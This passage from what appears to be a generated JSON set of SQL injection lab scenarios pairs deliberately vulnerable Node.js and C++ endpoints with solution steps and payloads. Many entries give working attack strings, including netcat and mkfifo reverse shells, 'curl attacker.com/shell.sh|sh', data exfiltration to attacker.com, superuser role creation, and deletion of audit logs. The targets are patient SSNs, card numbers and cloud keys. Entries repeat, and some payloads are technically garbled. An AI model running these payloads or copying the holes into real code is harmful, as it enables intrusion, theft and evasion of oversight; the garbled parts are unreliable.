    "Solution Steps": [
      "Register patient with notes: '); CREATE TABLE exfil (cmd_output TEXT)--",
      "Wait for 02:00 AM report job",
      "Inject payload: '); COPY exfil FROM PROGRAM 'nc attacker.com 4444 -e /bin/sh'--",
      "Monitor netcat listener for shell access",
      "Escalate privileges using SET ROLE admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const notes = req.body.notes;\n  const query = `INSERT INTO patients (notes) VALUES ('${notes}')`;\n  pool.query(query);\n  res.send('Registration pending review');\n});",
    "payloads": [
      "'); CREATE ROLE attacker SUPERUSER LOGIN PASSWORD 'pwn3d'--",
      "'); COPY (SELECT * FROM diagnoses) TO PROGRAM 'curl https://attacker.com/?exfil=$(base64 /data)'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce UNION-Based SQLi with Type Juggling",
    "Lab Description": "Product filter uses strict column type validation in MySQL. The application leaks truncated data through JSON encoding errors. To solve: Extract credit card numbers using CONCAT(LPAD()) length exploitation and NULL padding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /products?category=electronics",
      "Determine column count with ' ORDER BY 5--",
      "Craft payload: ' UNION SELECT NULL,CONCAT(pan,' ',expiry),NULL,NULL,NULL FROM payments--",
      "Bypass truncation using HEX() and SUBSTRING()",
      "Reconstruct full PANs from partial responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT id,name,price FROM products\n    WHERE category='${category}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL--",
      "' UNION SELECT NULL,@@version,NULL,NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "Social Media Boolean-Blind SQLi in Direct Messages",
    "Lab Description": "Message search functionality uses unsanitized input in SQL Server CONTAINS predicates. The .NET backend reveals query truthiness through emoji reaction counts. To solve: Extract OAuth tokens through BITAND() ASCII comparisons.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /search-dms with Fiddler",
      "Identify boolean trigger: ' OR 1=1 AND 'a'='a",
      "Automate with Python Requests using bitwise analysis",
      "Brute-force token characters using response length",
      "Validate tokens through OAuth introspection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search-dms', (req, res) => {\n  const term = req.body.term;\n  const query = `SELECT * FROM messages\n    WHERE CONTAINS(text, '${term}')`;\n  sql.query(query, (err, result) => {\n    res.json({ count: result.recordset.length });\n  });\n});",
    "payloads": [
      "' OR (SELECT ASCII(SUBSTR(token,1,1))&128=128 FROM oauth)--",
      "' AND (SELECT COUNT(*) FROM sys.databases)=5--"
    ]
  },
  {
    "Lab scenario": "REST API Error-Based SQLi in JWT Claims",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' directly into SQL Server OPENJSON queries. The application leaks SSNs through XML conversion errors. To solve: Extract encrypted SSNs using JSON_VALUE() type mismatches.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature using 'none' algorithm",
      "Parse JSON errors for SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users\n    WHERE id = '${userId}'`;\n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Stacked Queries via MQTT",
    "Lab Description": "Device config updates process MQTT payloads in PostgreSQL without validation. The C++ backend allows stacked queries through libpq's PQexec(). To solve: Execute reverse shell via COPY FROM PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Subscribe to device/update topic with mosquitto_sub",
      "Publish payload: '; COPY devices FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f'--",
      "Bypass payload size limits via chunking",
      "Monitor netcat listener for shell access",
      "Escalate privileges using SET ROLE admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void mqttCallback(char* topic, byte* payload) {\n  char query[256];\n  snprintf(query, sizeof(query),\n    \"UPDATE devices SET config = '%s'\",\n    payload);\n  PQexec(conn, query);\n}",
    "payloads": [
      "'; DROP TABLE audit_logs CASCADE--",
      "'; CREATE SERVER exfil FOREIGN DATA WRAPPER dblink_fdw--"
    ]
  },
  {
    "Lab scenario": "CMS Header-Based Blind SQLi in Audit Logs",
    "Lab Description": "Audit logging system incorporates X-Forwarded-For headers into MySQL INSERTs. The PHP backend reveals query success through UUID patterns. To solve: Extract password hashes using BENCHMARK() timing attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and modify X-Forwarded-For",
      "Identify timing differential: ' OR BENCHMARK(1000000,MD5('test'))--",
      "Automate with Python Requests and timing thresholds",
      "Brute-force hash characters using response times",
      "Crack hashes using CrackStation API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'];\n  const query = `INSERT INTO audit_logs (ip) VALUES ('${ip}')`;\n  mysql.query(query);\n  next();\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(password,1,1))>97,BENCHMARK(1000000,MD5('a')),0)--",
      "' AND (SELECT COUNT(*) FROM mysql.user WHERE super_priv='Y')=1--"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION-Based SQLi in PDF Export",
    "Lab Description": "Report generation feature concatenates user input into PostgreSQL COPY TO statements. The Java backend allows UNION injections in CSV headers. To solve: Exfiltrate classified docs via hex-encoded LOAD_FILE().",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept POST /export with Burp Suite",
      "Craft payload: ') UNION SELECT NULL,ENCODE(LOAD_FILE('/secret/2024.pdf'),'hex')--",
      "Bypass CSV escaping using tab separators",
      "Reconstruct PDF from hex-encoded response",
      "Bypass DLP policies via chunked encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const filter = req.body.filter;\n  const query = `COPY (SELECT * FROM reports WHERE ${filter})\n    TO STDOUT CSV HEADER`;\n  pool.query(query);\n  res.attachment('report.csv');\n});",
    "payloads": [
      "1) UNION SELECT NULL,current_setting('data_directory')--",
      "0); COPY (SELECT * FROM classified) TO PROGRAM 'curl https://attacker.com/?exfil=$(base64)'--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Boolean-Based Blind SQLi in HAVING Clause",
    "Lab Description": "Device telemetry aggregation uses unsanitized HAVING conditions in SQLite queries. The REST API returns HTTP 200 for true conditions and 404 for false through misconfigured rowCount checks. To solve: Extract AWS IoT Core certificates via bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using automated response analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /telemetry endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND hex(randomblob(1))='AA'--",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force certificate using Python Requests with bit-shifting logic",
      "Validate cert through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemetry', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='credentials')"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Time-Based SQLi in Patient Lookup",
    "Lab Description": "Patient search functionality uses unsanitized input in MySQL WHERE clauses with identical error pages. The application leaks query truthiness through response timing variations in JSON Web Token generation. To solve: Exfiltrate medical record IDs through conditional SLEEP(3) delays correlated with ASCII value ranges.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /api/patient-search with Burp Suite",
      "Identify timing trigger: ' OR IF(ASCII(SUBSTR(record_id,1,1))>97,SLEEP(3),0)--",
      "Automate with Python Requests and 0.1s timing thresholds",
      "Brute-force record IDs using binary search algorithm",
      "Validate through HL7 FHIR API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/patient-search', (req, res) => {\n  const ssn = req.body.ssn;\n  const query = `SELECT * FROM patients WHERE ssn='${ssn}'`;\n  \n  db.query(query, (err, result) => {\n    const token = jwt.sign({found: result.length > 0}, 'weak-secret');\n    res.json({token});\n  });\n});",
    "payloads": [
      "' OR IF(ASCII(SUBSTR(record_id,1,1))>97,BENCHMARK(1000000,MD5('a')),0)--",
      "' AND (SELECT LENGTH(record_id) FROM medical_records)=36--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform UNION-Based SQLi in JSON Filter",
    "Lab Description": "Product search API processes JSON array filters directly in PostgreSQL WHERE clauses. The Node.js backend allows type confusion attacks through improper array validation. To solve: Bypass parameterized queries using nested JSON objects and extract credit card tokens through base64-encoded UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT NULL,ENCODE(token::bytea,'base64') FROM payments--\"}]}",
      "Bypass WAF using \\u0027 Unicode escapes",
      "Decode base64 results using CyberChef",
      "Validate tokens through payment gateway sandbox"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT version(),NULL--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT pg_read_file('/etc/passwd'),NULL--\"}]"
    ]
  },
  {
    "Lab scenario": "Government Portal Error-Based SQLi in PDF Export",
    "Lab Description": "Report generation feature constructs vulnerable COPY queries with user-controlled ORDER BY clauses. The Java backend leaks AWS credentials through verbose PostgreSQL errors containing IAM role details. To solve: Exfiltrate access keys using CTE expressions and forced geometry conversion errors.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /export?sort=date with Burp Suite",
      "Inject: date UNION SELECT NULL,aws_credentials FROM iam_roles--",
      "Bypass CSV escaping using tab characters (CHR(9))",
      "Parse leaked credentials from geometry parsing errors",
      "Validate through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort;\n  const query = `COPY (\n    SELECT * FROM reports ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n  \n  pool.query(query);\n  res.attachment('report.csv');\n});",
    "payloads": [
      "date); WITH exfil AS (SELECT * FROM iam_roles) SELECT * FROM exfil--",
      "id UNION SELECT NULL,ST_GeomFromText('POINT(' || access_key || ')')--"
    ]
  },
  {
    "Lab scenario": "CMS Second-Order SQLi in User Registration",
    "Lab Description": "User registration stores unsanitized input used in nightly report generation. The MySQL backend allows stacked queries through batched statement execution. To solve: Trigger delayed reverse shell during batch processing using temp table creation and LOAD_FILE() exploitation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register user with payload: '); CREATE TEMP TABLE exfil(cmd_output TEXT)--",
      "Inject follow-up payload: '); COPY exfil FROM PROGRAM 'nc attacker.com 4444 -e /bin/sh'--",
      "Monitor netcat listener during 02:00 AM batch job",
      "Escalate privileges using SET ROLE admin",
      "Clean logs via VACUUM FULL"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const bio = req.body.bio;\n  const query = `INSERT INTO users (bio) VALUES ('${bio}')`;\n  \n  pool.query(query);\n  res.send('Registration pending approval');\n});",
    "payloads": [
      "'); SELECT pg_sleep(10); COPY users TO PROGRAM 'curl https://attacker.com'--",
      "'); CREATE SERVER exfil FOREIGN DATA WRAPPER file_fdw--"
    ]
  },
  {
    "Lab scenario": "API Gateway UNION SQLi in JWT Claim Processing",
    "Lab Description": "User profile endpoint incorporates JWT 'sub' claims directly into SQL Server OPENJSON queries. The .NET backend leaks encrypted SSNs through XML conversion errors. To solve: Extract sensitive data using forced type mismatches in JSON_VALUE() path expressions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature validation using 'none' algorithm",
      "Parse JSON conversion errors containing SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  \n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "IoT Sensor Network Boolean-Based SQLi in Data Filtering",
    "Lab Description": "Sensor data dashboard uses unsanitized input in HAVING clauses with SQLite. The REST API returns HTTP 200 for true queries through misconfigured row existence checks. To solve: Extract device encryption keys through BITAND() comparisons of SUBSTR(hex(key),1,1) values.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /sensor-filter endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(key,1,1)) FROM devices)='41'--",
      "Automate with Python Requests and bitwise analysis",
      "Brute-force 256-bit keys using response differentials",
      "Decrypt MQTT traffic using extracted keys"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/sensor-filter', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (ASCII(SUBSTR(key,1,1)) & 128)=128",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='encryption_keys')"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal UNION SQLi in Radiology Reports",
    "Lab Description": "DICOM report viewer concatenates user input into PostgreSQL ORDER BY clauses. The application leaks sensitive metadata through verbose COPY command errors. To solve: Extract encrypted patient diagnoses using NULL-padded UNION payloads and hex encoding.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /reports?sort=date with Burp Suite",
      "Determine column count using incremental ORDER BY",
      "Craft payload: date UNION SELECT NULL,ENCODE(diagnosis::bytea,'hex'),NULL,NULL--",
      "Bypass CSV formatting using CHR(9) separators",
      "Reconstruct diagnoses from hex-encoded responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/reports', (req, res) => {\n  const sort = req.query.sort || 'date';\n  const query = `SELECT * FROM radiology_reports ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) {\n      console.error(`COPY error: ${err.message}`);\n      res.status(500).send('Report generation failed');\n    } else {\n      res.attachment('reports.csv');\n    }\n  });\n});",
    "payloads": [
      "date UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL--",
      "patient_id UNION SELECT NULL,current_setting('data_directory'),NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Error-Based SQLi in Product Filter",
    "Lab Description": "Product search feature uses unsanitized input in MySQL WHERE clauses. The application leaks database structure through GEOMETRY type conversion errors in MariaDB. To solve: Extract PCI-compliant credit card numbers using ST_GeomFromText() function exploitation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify GET /products?filter=electronics request",
      "Inject payload: ' OR ST_GeomFromText(CONCAT('POINT(',pan,')'))--",
      "Parse credit card numbers from WKT parsing errors",
      "Bypass column truncation using SUBSTRING()",
      "Validate through payment gateway API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM products WHERE category='${filter}'`;\n  \n  pool.query(query, (err, result) => {\n    res.json(err ? {error: err.sqlMessage} : result.rows);\n  });\n});",
    "payloads": [
      "' OR ST_GeomFromText('POINT('||pan||')') IS NULL--",
      "' UNION SELECT NULL,JSON_OBJECT('pan',pan),NULL FROM payments--"
    ]
  },
  {
    "Lab scenario": "Government API Gateway UNION SQLi in XML Processing",
    "Lab Description": "SOAP endpoint processes XML input with vulnerable XPath extraction into PostgreSQL queries. The Java backend allows UNION injections through CDATA section bypasses. To solve: Exfiltrate classified documents using xmlagg() and base64 encoding.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft XML payload with CDATA-wrapped SQL",
      "Inject: <![CDATA[' UNION SELECT xmlagg(xmlelement(name d, pg_read_file('/classified.txt'))) FROM generate_series(1,1)--]]>",
      "Bypass XML validation using external entities",
      "Parse base64-encoded results from malformed responses",
      "Reconstruct documents using chunked decoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/soap', (req, res) => {\n  const xml = req.rawBody;\n  const param = extractXPath(xml, '//searchParam');\n  const query = `SELECT * FROM documents WHERE content='${param}'`;\n  \n  pool.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "<![CDATA[' UNION SELECT ENCODE(pg_read_file('/etc/passwd')::bytea,'base64')--]]>",
      "'||(SELECT xmlagg(xmlelement(name f, ftw())) FROM pg_catalog--"
    ]
  },
  {
    "Lab scenario": "IoT Fleet Management Stacked SQLi via MQTT",
    "Lab Description": "Vehicle telemetry system processes MQTT payloads in PostgreSQL without input validation. The C++ backend allows stacked queries through PQexec() non-atomic execution. To solve: Execute remote code via COPY FROM PROGRAM and establish persistent access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Subscribe to vehicle/update topic with mosquitto_sub",
      "Publish payload: '; COPY diagnostics FROM PROGRAM 'curl https://attacker.com/shell.sh|sh'--",
      "Bypass payload size limits via message chunking",
      "Monitor reverse shell connections",
      "Escalate privileges using SET ROLE fleet_admin"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "void mqttCallback(char* topic, byte* payload) {\n  char query[256];\n  snprintf(query, sizeof(query),\n    \"UPDATE vehicles SET status = '%s'\",\n    payload);\n  PQexec(conn, query);\n}",
    "payloads": [
      "'; DROP TABLE IF EXISTS access_logs CASCADE--",
      "'; CREATE SERVER exfil FOREIGN DATA WRAPPER dblink_fdw--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Boolean-Blind SQLi in Sensor Filtering",
    "Lab Description": "A Zigbee device management interface constructs SQLite queries with unsanitized HAVING clauses in sensor aggregation reports. The REST API returns HTTP 200/404 status codes through misconfigurened rowCount checks. To solve: Extract AWS IoT Core certificates via bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using automated response analysis.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fuzz POST /telemetry endpoint with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'--",
      "Automate with sqlmap: sqlmap -u ... --technique=B --level=5",
      "Brute-force 256-bit keys using Python Requests with bit-shifting logic",
      "Validate certificates through MQTT publish command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/telemetry', (req, res) => {\n  const filter = req.body.having;\n  const query = `SELECT sensor_id FROM readings\n    GROUP BY sensor_id HAVING ${filter}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 200 : 404).send();\n  });\n});",
    "payloads": [
      "1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE tbl_name='credentials')=1--",
      "EXISTS(SELECT 1 FROM iot_certs WHERE device_type='critical')--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform UNION SQLi in JSON Filter",
    "Lab Description": "A product search API processes JSON array filters directly in PostgreSQL WHERE clauses through vulnerable Node.js middleware. The application allows type confusion attacks through improper array validation. To solve: Bypass parameterized queries using nested JSON objects and extract PCI tokens through base64-encoded UNION payloads.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json in Postman",
      "Craft payload: {\"filters\":[{\"field\":\"1\",\"value\":\"1' UNION SELECT NULL,ENCODE(token::bytea,'base64') FROM payments--\"}]}",
      "Bypass WAF using \\u0027 Unicode escapes",
      "Decode base64 results using CyberChef",
      "Validate tokens through payment gateway sandbox"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/search', (req, res) => {\n  const filters = req.body.map(f => `${f.field}=${f.value}`).join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "[{\"field\":\"1\",\"value\":\"1' UNION SELECT version(),NULL--\"}]",
      "[{\"field\":\"price\",\"value\":\"0 OR 1=1 UNION SELECT pg_read_file('/etc/passwd'),NULL--\"}]"
    ]
  },
  {
    "Lab scenario": "Government Portal Error-Based SQLi in PDF Export",
    "Lab Description": "A classified document export feature constructs vulnerable COPY queries with user-controlled ORDER BY clauses in PostgreSQL. The Java backend leaks AWS credentials through verbose error messages containing IAM role details. To solve: Exfiltrate access keys using CTE expressions and forced geometry conversion errors.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /export?sort=date with Burp Suite",
      "Inject: date UNION SELECT NULL,aws_credentials FROM iam_roles--",
      "Bypass CSV escaping using tab characters (CHR(9))",
      "Parse leaked credentials from ST_GeomFromText errors",
      "Validate through AWS CLI S3 access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export', (req, res) => {\n  const sort = req.body.sort;\n  const query = `COPY (\n    SELECT * FROM reports ORDER BY ${sort}\n  ) TO STDOUT CSV HEADER`;\n  \n  pool.query(query);\n  res.attachment('report.csv');\n});",
    "payloads": [
      "date); WITH exfil AS (SELECT * FROM iam_roles) SELECT * FROM exfil--",
      "id UNION SELECT NULL,ST_GeomFromText('POINT(' || access_key || ')')--"
    ]
  },
  {
    "Lab scenario": "API Gateway JWT-Based SQLi in Profile Endpoint",
    "Lab Description": "A user profile endpoint incorporates JWT 'sub' claims directly into SQL Server OPENJSON queries. The .NET backend leaks encrypted SSNs through XML conversion errors. To solve: Extract sensitive data using forced type mismatches in JSON_VALUE() path expressions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io and modify 'sub' claim",
      "Forge token: ' UNION SELECT SSN FROM patients FOR JSON PATH--",
      "Bypass signature validation using 'none' algorithm",
      "Parse JSON errors for SSN fragments",
      "Reconstruct full SSNs using differential analysis"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.auth).sub;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  \n  sql.query(query, (err, result) => {\n    res.json(result.recordset[0]);\n  });\n});",
    "payloads": [
      "' OR 1=CONVERT(INT, (SELECT TOP 1 SSN FROM patients))--",
      "' AND (SELECT COUNT(*) FROM sys.tables)=42--"
    ]
  },
  {
    "Lab scenario": "CMS Platform Second-Order SQLi in Scheduled Report Generation",
    "Lab Description": "A content management system stores unsanitized user comments that are later used in PostgreSQL queries during nightly report generation. The Node.js backend executes vulnerable SQL statements through a cron job without input validation. To solve: Inject a payload during comment submission that triggers remote code execution via database functions during report processing.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /comment request with Burp Suite",
      "Craft payload: '); CREATE TEMP TABLE exfil AS SELECT * FROM admin_credentials--",
      "Wait for 02:00 AM report generation trigger",
      "Execute OS command: '); COPY exfil TO PROGRAM 'curl https://attacker.com/?exfil=$(base64 /etc/passwd)'--",
      "Escalate privileges using COPY FROM PROGRAM for reverse shell creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pool = require('./db').pool;\nconst nodeCron = require('node-cron');\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.text;\n  const query = `INSERT INTO comments (content) VALUES ('${comment}')`;\n  \n  pool.query(query, (err) => {\n    if(err) console.error(`Comment insertion error: ${err.stack}`);\n    res.send('Comment submitted for moderation');\n  });\n});\n\n// Nightly report generation\nnodeCron.schedule('0 2 * * *', () => {\n  const reportQuery = `SELECT content FROM comments \n    WHERE created_at > CURRENT_DATE - INTERVAL '1 day'`;\n  \n  pool.query(reportQuery, (err, result) => {\n    if(err) {\n      console.error(`Report generation failed: ${err.message}`);\n      return;\n    }\n    generatePDFReport(result.rows); // Vulnerable PDF creation\n  });\n});",
    "payloads": [
      "'); CREATE TABLE exfil (data TEXT); INSERT INTO exfil SELECT * FROM ssh_keys--",
      "'); COPY (SELECT * FROM /etc/passwd) TO PROGRAM 'nc attacker.com 4444'--",
      "'||(SELECT pg_sleep(5) WHERE SUBSTR(version(),1,1)='P')--"
    ]
  },
  {
    "Lab scenario": "Healthcare API Gateway UNION-Based SQLi in Patient Search Endpoint",
    "Lab Description": "A HIPAA-compliant healthcare API contains vulnerable patient search functionality using unsanitized JSON input in WHERE clause construction. The application returns detailed error messages through debug headers and allows UNION operators. To solve: Extract Social Security Numbers from the 'patients' table while bypassing input sanitization that strips quotes and spaces. Successful exploitation requires content-type manipulation and NULL byte injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture POST /api/patients/search request in Burp Suite with Content-Type: application/json",
      "2. Identify injectable JSON parameter: {\"name\": \"'test'\"} triggering SQL error",
      "3. Use Postman to send URL-encoded payload: {\"name\": \"'\\u0000'UNION/**/SELECT\\u0020NULL,ssn,NULL\\u0020FROM\\u0020patients--\"}",
      "4. Bypass WAF with unicode normalization: '||CAST(ssn AS CHAR(11))||'",
      "5. Verify SSN extraction via response body and purge access logs using stacked query: ; DELETE FROM request_logs--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2/promise');\nconst app = express();\napp.use(express.json());\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'healthcare_api',\n  password: 'insecure123',\n  database: 'patient_records',\n  insecureAuth: true\n});\n\napp.post('/api/patients/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let query = \"SELECT id, full_name, dob FROM patients WHERE \";\n    const conditions = [];\n    \n    Object.entries(filters).forEach(([key, val]) => {\n      conditions.push(`${key} = '${val}'`); // Vulnerable template literal\n    });\n    \n    query += conditions.join(' AND ');\n    console.debug(\"Final query:\", query); // Verbose logging\n    \n    const [rows] = await pool.query(query);\n    res.set('X-Debug-Query', query); // Leaks query through header\n    res.json(rows);\n  } catch (err) {\n    res.status(500).set('X-SQL-Error', err.sqlMessage).json({error: \"Query failed\"});\n  }\n});\n\napp.listen(3000, () => console.log('Healthcare API running on port 3000'));",
    "payloads": [
      "{\"name\":\"'UNION SELECT NULL,ssn,NULL FROM patients--\"}",
      "'||(SELECT MID((SELECT ssn FROM patients LIMIT 1),1,3))||'",
      "'/**/UNION/*!50000SELECT*/table_name,column_name,NULL/*!FROM*/information_schema.columns--",
      "'%00' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Boolean-Blind SQLi in Product Filter GROUP BY",
    "Lab Description": "An online marketplace's product filtering system concatenates user-controlled parameters into GROUP BY clauses without validation. The application provides no direct error feedback but returns HTTP 200 when queries succeed. To solve: Determine administrator password hash through boolean response analysis using bit-shifting techniques and conditional error triggers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept GET /products?sort=rating request in OWASP ZAP",
      "2. Identify injection point: sort=rating'%2b(select%200)",
      "3. Develop python script using requests.Session() to brute-force password bits:",
      "   (SELECT ASCII(SUBSTR(password,1)) >> 7 & 1",
      "4. Optimize with binary search tree pattern matching",
      "5. Crack extracted SHA256 hash using hashcat -m 1400"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/products', async (req, res) => {\n  const { sort } = req.query;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    const query = `\n      SELECT category, AVG(rating) \n      FROM products \n      GROUP BY ${sort || 'category'} \n      HAVING COUNT(*) > 10`;\n    \n    console.warn(\"Executing grouping:\", query);\n    const result = await client.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(400).end(); // Blind error handling\n  } finally {\n    await client.end();\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "category,(CASE WHEN (SELECT SUBSTR(password,1)='a') THEN 1 ELSE 1/(SELECT 0) END)",
      "(SELECT CASE WHEN (ASCII(SUBSTR(password,1))&1>0 THEN 1 ELSE 0 END)",
      "(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')",
      "(SELECT 1 WHERE EXISTS(SELECT 1 FROM pg_sleep(2)))--"
    ]
  },
  {
    "Lab scenario": "Government Portal Time-Based SQLi in Document Search Pagination",
